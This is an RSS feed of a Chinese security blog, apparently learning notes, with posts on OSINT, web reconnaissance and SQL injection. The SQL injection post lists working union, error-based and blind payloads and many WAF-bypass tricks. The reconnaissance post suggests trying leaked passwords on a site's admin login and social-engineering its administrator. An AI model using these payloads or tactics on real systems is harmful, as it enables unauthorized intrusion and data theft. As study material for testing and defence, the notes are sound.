<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>学无止境</title>
        <subtitle>与众不同，就一定会痛苦</subtitle>
        <icon>http://example.com/images/favicon.ico</icon>
        <link>http://example.com</link>
        <author>
          <name>Blank</name>
        </author>
        <description>繁星不怕被看作流萤</description>
        <language>zh-CN</language>
        <pubDate>Tue, 11 Apr 2023 15:39:25 +0800</pubDate>
        <lastBuildDate>Tue, 11 Apr 2023 15:39:25 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/11/Internet%20Security/OSINT/</guid>
            <title>OSINT</title>
            <link>http://example.com/2023/04/11/Internet%20Security/OSINT/</link>
            <category term="网安" scheme="http://example.com/categories/%E7%BD%91%E5%AE%89/" />
            <category term="信息搜集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" />
            <pubDate>Tue, 11 Apr 2023 15:39:25 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;1-什么是OSINT&#34;&gt;&lt;a href=&#34;#1-什么是OSINT&#34; class=&#34;headerlink&#34; title=&#34;1.什么是OSINT&#34;&gt;&lt;/a&gt;1.什么是OSINT&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;OSINT（Open-source Intelligence）即开源情报搜集，是用多元化方法进行搜集、分析和通过公开信息进行决策的一种方法。在情报界，Open指的是侵略性、公开的资源.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;它是一种已被用于国家安全情报活动的方法，其目的是从报纸、新闻、网站和 SNS 等各种信息中预测国家和公司的政策。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;此外，通过使用 OSINT 收集信息，可以检测泄露的个人信息和机密信息，因此近年来它也被用于防御网络攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;个人信息检查&#34;&gt;&lt;a href=&#34;#个人信息检查&#34; class=&#34;headerlink&#34; title=&#34;个人信息检查&#34;&gt;&lt;/a&gt;个人信息检查&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v&#34;&gt;Have I Been Pwned &lt;/span&gt;&lt;ul&gt;
&lt;li&gt;只需输入您的电子邮件地址即可检查您的个人信息是否已被泄露&lt;br&gt;&lt;img data-src=&#34;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
&lt;li&gt;并且当未来发生 pwnage 并且您的帐户被盗用时，您会收到通知。&lt;br&gt;&lt;img data-src=&#34;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
&lt;li&gt;还能进行域名搜索&lt;br&gt;（在整个域中搜索被盗用的帐户并接收未来的通知）&lt;br&gt; &lt;img data-src=&#34;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
&lt;li&gt;还会显示一些违规网站&lt;br&gt;&lt;img data-src=&#34;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/4.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
&lt;li&gt;还能查看密码是否安全&lt;br&gt;&lt;img data-src=&#34;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/6.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
&lt;li&gt;还提供了一些API(当然需要$)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;2. &lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</guid>
            <title>信息搜集</title>
            <link>http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</link>
            <category term="网安" scheme="http://example.com/categories/%E7%BD%91%E5%AE%89/" />
            <category term="信息搜集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" />
            <pubDate>Mon, 10 Apr 2023 19:08:20 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;web&#34;&gt;&lt;a href=&#34;#web&#34; class=&#34;headerlink&#34; title=&#34;web&#34;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&#34;cdn获取真实ip&#34;&gt;&lt;a href=&#34;#cdn获取真实ip&#34; class=&#34;headerlink&#34; title=&#34;cdn获取真实ip&#34;&gt;&lt;/a&gt;cdn获取真实ip&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;方法一：&lt;br&gt;从全球各地去ping他的服务器（万一在一些穷乡僻壤的地方ping到了呢）&lt;/li&gt;
&lt;li&gt;方法二：&lt;br&gt;使用邮件订阅或RSS订阅的一种形式（大部分cdn不会防御件订阅或RSS订阅的东西）&lt;/li&gt;
&lt;li&gt;方法三：&lt;br&gt;ping二级域名（有些网站的二级域名可能不会做cdn）&lt;/li&gt;
&lt;li&gt;方法四：&lt;br&gt;用nslookup&lt;/li&gt;
&lt;li&gt;方法五：&lt;br&gt;查找一下域名的历史解析记录，毕竟域名再用cdn之前可能是用真实的ip&lt;/li&gt;
&lt;li&gt;F6：&lt;br&gt;phpinfo上可能显示他的真实ip&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;域名–渗透&#34;&gt;&lt;a href=&#34;#域名–渗透&#34; class=&#34;headerlink&#34; title=&#34;域名–渗透&#34;&gt;&lt;/a&gt;域名–渗透&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.确定站点是否是主站&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果是，先进行子域名的挖掘，然后从子域名入手，确定一下使用了什么服务器（中间件），查看一下他的CMS，用什么编程语言，大概使用了什么数据库，有没有使用cdn，如果有cdn，则需要搜集一下网站的真实ip，然后看一下网站的源代码是不是存在着信息泄露，有时还可以进一步对网站进行信息搜集，比如：whois查询，ip访查，使用google进行查询（黑客引擎进行敏感信息的搜集），查看目标的功能模块有没有文件上传，sql注入，xss等等漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;扫描问题&#34;&gt;&lt;a href=&#34;#扫描问题&#34; class=&#34;headerlink&#34; title=&#34;扫描问题&#34;&gt;&lt;/a&gt;扫描问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Mysql 只扫到了80端口&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;可能将Mysql端口改了&lt;/li&gt;
&lt;li&gt;也可能是站库分离&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Mysql数据库与网站分离，渗透进去后你可能发现他的配置文件里可能有去远程连接其他专门的数据库服务器的配置文件&lt;blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;3306端口不对外开放（用防火墙将自己的3306端口从内部deny掉了）&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;搜集目标网站注册人的信息&#34;&gt;&lt;a href=&#34;#搜集目标网站注册人的信息&#34; class=&#34;headerlink&#34; title=&#34;搜集目标网站注册人的信息&#34;&gt;&lt;/a&gt;搜集目标网站注册人的信息&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;考虑用telegram上的一些社工库，看一下有没有他泄露的一些密码，尝试使用其泄露的密码去登录网站的后台。&lt;/li&gt;
&lt;li&gt;搜索引擎搜索邮箱关键词，看看他有没有在网上发布一些言论。&lt;/li&gt;
&lt;li&gt;利用搜索到的一些关联信息去找出其他的关联信息（邮箱，账号等等）与其聊天，套取一些信息。&lt;/li&gt;
&lt;li&gt;用社会工程学的方法去找到他的一些社交帐号（可能会在里面找到管理员设置密码的一些习惯）。&lt;/li&gt;
&lt;li&gt;利用已经拥有的信息生成一个专用的字典。&lt;/li&gt;
&lt;li&gt;观察管理员会逛哪些比较大众性的网站，通过这些网站可能会看到他密码提示的一些内容。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;windows-or-linux&#34;&gt;&lt;a href=&#34;#windows-or-linux&#34; class=&#34;headerlink&#34; title=&#34;windows or linux&#34;&gt;&lt;/a&gt;windows or linux&lt;/h3&gt;&lt;p&gt; 区分–&amp;gt; windows大小写不敏感，Linux大小写敏感&lt;/p&gt;
&lt;h3 id=&#34;有一个网站&#34;&gt;&lt;a href=&#34;#有一个网站&#34; class=&#34;headerlink&#34; title=&#34;有一个网站&#34;&gt;&lt;/a&gt;有一个网站&lt;/h3&gt;&lt;h4 id=&#34;如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php&#34;&gt;&lt;a href=&#34;#如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php&#34; class=&#34;headerlink&#34; title=&#34;如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)&#34;&gt;&lt;/a&gt;如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;直接在网站的二级文件xxx底下扫描敏感文件/目录。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;如果在网站的表面&#34;&gt;&lt;a href=&#34;#如果在网站的表面&#34; class=&#34;headerlink&#34; title=&#34;如果在网站的表面&#34;&gt;&lt;/a&gt;如果在网站的表面&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;在表面进行元素审查时，可以知道这个网站所利用的防护软件&lt;ul&gt;
&lt;li&gt;在敏感操作中被拦截/通过界面无法判断使用了什么防护软件时，可以用f12去看一下html&lt;pre&gt;&lt;code&gt;  * 如：&amp;lt;护卫神&amp;gt; ---会出现&amp;lt;hws&amp;gt;xxxx&amp;lt;/hws&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有时可以用img标签，当图片加载不出来会触发onerror属性,来获取管理员的一个后台路径&lt;/li&gt;
&lt;li&gt;还可以尝试在src里指定一个远程的脚本文件，获取referer&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;有时网站后台会做限制&#34;&gt;&lt;a href=&#34;#有时网站后台会做限制&#34; class=&#34;headerlink&#34; title=&#34;有时网站后台会做限制&#34;&gt;&lt;/a&gt;有时网站后台会做限制&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;有时src属性的结尾必须要是.jpg .png .gif,&lt;ul&gt;
&lt;li&gt;可以考虑用.htaccess在远程服务器上修改apache的配置文件&lt;/li&gt;
&lt;li&gt;或将.jpg文件当作php执行&lt;pre&gt;&lt;code&gt;     * AppType application/x-http-php .jpg(打进去后一定要删掉）
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;当在表面上没有看到一些漏洞&#34;&gt;&lt;a href=&#34;#当在表面上没有看到一些漏洞&#34; class=&#34;headerlink&#34; title=&#34;当在表面上没有看到一些漏洞&#34;&gt;&lt;/a&gt;当在表面上没有看到一些漏洞&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;1 可以去查找旁站&lt;br&gt;           * 旁站—-&amp;gt; 同一服务器上可能开了多台虚拟机，打下一台后可以借此把其他的也给打下来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;百度域名的查找&lt;/li&gt;
&lt;li&gt;百度ip访查域名（通过这个ip查找挂在其下的有哪些域名）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;信息搜集流程&#34;&gt;&lt;a href=&#34;#信息搜集流程&#34; class=&#34;headerlink&#34; title=&#34;信息搜集流程&#34;&gt;&lt;/a&gt;信息搜集流程&lt;/h3&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;服务器的相关信息&lt;ul&gt;
&lt;li&gt;真实ip&lt;/li&gt;
&lt;li&gt;系统类型及版本&lt;/li&gt;
&lt;li&gt;开放端口&lt;/li&gt;
&lt;li&gt;使用什么waf&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网站的指纹&lt;ul&gt;
&lt;li&gt;CMS&lt;/li&gt;
&lt;li&gt;cdn&lt;/li&gt;
&lt;li&gt;证书&lt;/li&gt;
&lt;li&gt;dns记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;whois的信息（社工库中寻找）&lt;ul&gt;
&lt;li&gt;姓名&lt;/li&gt;
&lt;li&gt;备案&lt;/li&gt;
&lt;li&gt;邮箱&lt;/li&gt;
&lt;li&gt;电话访查&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;子域名 旁站  c段（ip的网段）&lt;/li&gt;
&lt;li&gt;google进行针对化的搜索&lt;ul&gt;
&lt;li&gt;查pdf文件&lt;/li&gt;
&lt;li&gt;中间件版本&lt;/li&gt;
&lt;li&gt;弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;扫描网站目录&lt;br&gt; 爆破后台&lt;br&gt; 测试文件&lt;br&gt; 敏感文件&lt;/li&gt;
&lt;li&gt;传输协议&lt;ul&gt;
&lt;li&gt;exp&lt;/li&gt;
&lt;li&gt;寻找相应源码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;漏洞挖掘&#34;&gt;&lt;a href=&#34;#漏洞挖掘&#34; class=&#34;headerlink&#34; title=&#34;漏洞挖掘&#34;&gt;&lt;/a&gt;漏洞挖掘&lt;/h3&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;浏览网站&lt;ul&gt;
&lt;li&gt;看一下网站的规模，功能，特点&lt;/li&gt;
&lt;li&gt;查看端口，目录，弱口令（进行一个扫描）&lt;ul&gt;
&lt;li&gt;有端口响应，要对其进行探测&lt;ul&gt;
&lt;li&gt;如：rsync，心脏出血漏洞，mysql漏洞，ftp,ssh,弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;xss   sql注入  文件上传  命令注入     csrf    cookie安全检查     敏感信息     通信数据传输     暴力破解     越权访问     未授权访问     目录遍历     文件包含     重放攻击     服务器漏洞检测     漏洞扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/09/Internet%20Security/hello-world/</guid>
            <title>SQL注入</title>
            <link>http://example.com/2023/04/09/Internet%20Security/hello-world/</link>
            <category term="网安" scheme="http://example.com/categories/%E7%BD%91%E5%AE%89/" />
            <category term="Top10" scheme="http://example.com/tags/Top10/" />
            <pubDate>Sun, 09 Apr 2023 11:33:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;本周重点&#34;&gt;&lt;a href=&#34;#本周重点&#34; class=&#34;headerlink&#34; title=&#34;本周重点&#34;&gt;&lt;/a&gt;本周重点&lt;/h1&gt;&lt;h3 id=&#34;1-产生原理（实质）&#34;&gt;&lt;a href=&#34;#1-产生原理（实质）&#34; class=&#34;headerlink&#34; title=&#34;1.产生原理（实质）&#34;&gt;&lt;/a&gt;1.产生原理（实质）&lt;/h3&gt;&lt;p&gt;1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码&lt;br&gt;2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码&lt;/p&gt;
&lt;h3 id=&#34;2-类型&#34;&gt;&lt;a href=&#34;#2-类型&#34; class=&#34;headerlink&#34; title=&#34;2.类型&#34;&gt;&lt;/a&gt;2.类型&lt;/h3&gt;&lt;p&gt;1.联合注入&lt;br&gt;        2.堆叠注入&lt;br&gt;        3.宽字节注入&lt;br&gt;        4.cookie注入&lt;br&gt;        5.XFF头注入&lt;br&gt;        6.UA注入（user-agent注入）&lt;br&gt;        7.Referer注入&lt;br&gt;        8.二次注入&lt;br&gt;        9.base64注入&lt;br&gt;        11.万能密码&lt;br&gt;        12.文件读写&lt;br&gt;盲注类型：&lt;br&gt;        1.基于时间的盲注     sleep()   benchmark()&lt;br&gt;        2.基于布尔的注入&lt;br&gt;        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()&lt;/p&gt;
&lt;h3 id=&#34;语言&#34;&gt;&lt;a href=&#34;#语言&#34; class=&#34;headerlink&#34; title=&#34;语言&#34;&gt;&lt;/a&gt;语言&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;SQL&#34;&gt;一，union select
?id=-2 &amp;#39;   &amp;quot;   )     &amp;#39;)    &amp;quot;)      ]     )]
order by 3 --+
union select 1,2,3 --+
union select 1,database(),3 --+
union select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+
union select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&amp;quot;&amp;quot;,3--+
union select 1,select group_concat(id)from users,3 --+
二，报错注入
1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+
2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+
0x7e----&amp;gt;~
0x3a----&amp;gt;:
三,爆出
index.php?id=2&amp;#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-如何防范&#34;&gt;&lt;a href=&#34;#3-如何防范&#34; class=&#34;headerlink&#34; title=&#34;3.如何防范&#34;&gt;&lt;/a&gt;3.如何防范&lt;/h3&gt;&lt;h4 id=&#34;存在哪些风险、对应的对策是什么。&#34;&gt;&lt;a href=&#34;#存在哪些风险、对应的对策是什么。&#34; class=&#34;headerlink&#34; title=&#34;存在哪些风险、对应的对策是什么。&#34;&gt;&lt;/a&gt;存在哪些风险、对应的对策是什么。&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)&lt;br&gt; 4那如何反防范呢？&lt;br&gt;接下来将展示一些绕过的姿势。&lt;br&gt;1.屏蔽or and 空格 注释符&lt;br&gt;or 用|| 或  |&lt;br&gt;and 用&amp;amp;&amp;amp; 或&amp;amp;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;4那如何反防范呢？&#34;&gt;&lt;a href=&#34;#4那如何反防范呢？&#34; class=&#34;headerlink&#34; title=&#34;4那如何反防范呢？&#34;&gt;&lt;/a&gt;4那如何反防范呢？&lt;/h3&gt;&lt;h4 id=&#34;接下来将展示一些绕过的姿势。&#34;&gt;&lt;a href=&#34;#接下来将展示一些绕过的姿势。&#34; class=&#34;headerlink&#34; title=&#34;接下来将展示一些绕过的姿势。&#34;&gt;&lt;/a&gt;接下来将展示一些绕过的姿势。&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;替代空格的东西&lt;br&gt;%09 水平tab键&lt;br&gt;%0a 新建一行&lt;br&gt;%0c 新建一页&lt;br&gt;%0d 回车键&lt;br&gt;%0b 垂直tab键&lt;br&gt;%a0 也是空格键&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;屏蔽–+号&lt;br&gt;用 or ‘1’ =’1 代替&lt;br&gt;如&lt;br&gt;?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1&lt;br&gt;如果哪天%的空格都不能用，不用空格&lt;br&gt;无空格写法用（）&lt;br&gt;?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&#34;SQL&#34;&gt;小知识:
对&amp;#39; \ 屏蔽，前面多加个\
数据库用的是gbk编码，会把2个字符当作一个汉字
如：
?id=1%df\&amp;#39;（在机器看来这就是个1+字符+&amp;#39;)
post类
burp抓包
在目标位置admin%df%27 union select 1,2 #

常见绕过：
1.大小写绕过
Union SelEct
2.双写绕过
ununionion
3.编码绕过
security--&amp;gt;hex编码
urlencode
4.注释符/**/
uni/**/on sel/**/ect
5.对于空格绕过
开头已提过了
6.对于or and绕过
and = &amp;amp;&amp;amp;
or = ||
7.单引号
%df%27
8.反引号
反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！
select username,password from `table1` where id=&amp;#39;1&amp;#39; limit 0,1
where
select * from `where` where id =1
9.内联注释
and /*!select*/ 1,2
10.&amp;lt;&amp;gt;绕过
uni&amp;lt;&amp;gt;on sel&amp;lt;&amp;gt;ect
对了这里加一布尔型的盲注(猜库名
select * from users where id=1 and ascii(substr(database(),0,1)) &amp;gt; 115
greatest least
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64


11.屏蔽逗号
select substr(&amp;quot;xxxxx&amp;quot;,1,3)
select substr(&amp;quot;xxxxx&amp;quot; from 1 to 3)

union select 1,2,3
union select * from (select 1)a join (select 2)b join (select 3)c;

limit 0,1
limit 0 offset 1
12.sleep屏蔽
and sleep(1)
and benchmark(100000000（0的个数视情况而定）,1);
13.group_concat屏蔽
select group_concat(&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;);
select concat_ws(&amp;quot; &amp;quot;,&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;);
（把&amp;quot;&amp;quot;放到&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;中间并合并输出）
14.等号屏蔽
用 like rlike regexp &amp;lt;&amp;gt;(不等号)?id=1&amp;#39; or 1 like 1
?id=1&amp;#39; or 1 &amp;lt;&amp;gt; 1
15.post情况屏蔽#
id=3&amp;quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#
16.ip地址拦截（只允许内网访问）
X-forwarded-for：ip地址
X-remote-IP：ip地址
X-Originating-IP：ip地址
X-remote-addr：ip地址
X-Real-Ip：ip地址
(一般放在抓包中间，DNT之后)
17.修改静态资源
http://www.xx.com/sql.php?id=1
可以替换为
http://www.xx.com/sql.php/1.js?id=1
18.url白名单
为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...
如:
http://www.xx.com/sql.php/admin.php?id=1
http://www.xx.com/sql.php?xxxx=/manager/&amp;amp;b=攻击代码

http://www.xx.com/../../../../manager/../sql.php?id=1
19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)
伪造自己是搜索引擎（修改user-agent）
将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent
20.数据库注释执行
/*!50001 select * from table1*/;
如果数据库版本是5.00.01 版本以下的，语句才会执行
/*!45509 union select */ 1,2,3 --+
21.增加干扰
union all %23%a0 select 1,2,3 --+
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;思考&#34;&gt;&lt;a href=&#34;#思考&#34; class=&#34;headerlink&#34; title=&#34;思考&#34;&gt;&lt;/a&gt;思考&lt;/h4&gt;&lt;p&gt;有什么想法或心得体会，都可以拿出来分享下。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
